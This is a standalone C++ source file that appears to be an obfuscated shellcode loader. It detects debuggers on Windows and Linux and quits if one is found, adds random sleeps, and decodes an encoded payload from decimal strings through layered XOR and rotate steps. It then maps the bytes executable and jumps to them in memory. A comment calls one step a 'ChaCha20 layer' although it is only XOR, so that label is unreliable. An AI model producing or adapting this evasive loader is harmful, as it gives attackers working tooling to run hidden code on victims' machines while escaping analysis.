#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool instHandler3141() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> funcHandler2869(const std::string& dec, size_t len) {
    std::vector<uint8_t> bytes(len, 0);
    std::string num = dec;
    for (int i = len - 1; i >= 0 && num != "0"; i--) {
        int remainder = 0;
        std::string quotient;
        for (char digit : num) {
            int current = remainder * 10 + (digit - '0');
            quotient += std::to_string(current / 256);
            remainder = current % 256;
        }
        bytes[i] = remainder;
        size_t firstNonZero = quotient.find_first_not_of('0');
        if (firstNonZero != std::string::npos) {
            num = quotient.substr(firstNonZero);
        } else {
            num = "0";
        }
    }
    return bytes;
}

int main() {
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (instHandler3141()) return 0;

    const char* methUtil1287 = "49236756152269708239485446768433802546536500928805508405804276707662009608654";
    auto key1 = funcHandler2869(methUtil1287, 32);
    const char* initComponent9069 = "64660486733197675811595103430849759515867405931911708673587917278860355751852";
    auto key2 = funcHandler2869(initComponent9069, 32);
    const char* objService8004 = "89291610409104270635881369087340990859";
    auto nonce = funcHandler2869(objService8004, 16);
    const char* payloadData = "1513325385186668639524";
    auto objCore9203 = funcHandler2869(payloadData, 9);

    // Decrypt nonce layer
    for (size_t i = 0; i < objCore9203.size(); i++) {
        objCore9203[i] ^= nonce[i % nonce.size()];
    }

    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < objCore9203.size(); i++) {
        objCore9203[i] ^= static_cast<uint8_t>((i * 0x9E3779B9) & 0xFF);
        objCore9203[i] ^= key2[i % key2.size()];
    }

    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt XOR layer
    for (size_t i = 0; i < objCore9203.size(); i++) {
        objCore9203[i] ^= static_cast<uint8_t>(i & 0xFF);
        objCore9203[i] = (objCore9203[i] << 3) | (objCore9203[i] >> 5);
        objCore9203[i] ^= key1[i % key1.size()];
    }

#ifdef _WIN32
    void* instRunner9359 = VirtualAlloc(0, objCore9203.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instRunner9359) return 1;
    memcpy(instRunner9359, objCore9203.data(), objCore9203.size());
    DWORD oldProtect;
    VirtualProtect(instRunner9359, objCore9203.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    (((void(*)())instRunner9359)());
    memset(instRunner9359, 0, objCore9203.size());
    VirtualFree(instRunner9359, 0, MEM_RELEASE);
#else
    void* instRunner9359 = mmap(0, objCore9203.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instRunner9359 == MAP_FAILED) return 1;
    memcpy(instRunner9359, objCore9203.data(), objCore9203.size());
    mprotect(instRunner9359, objCore9203.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    (((void(*)())instRunner9359)());
    memset(instRunner9359, 0, objCore9203.size());
    munmap(instRunner9359, objCore9203.size());
#endif
    return 0;
}
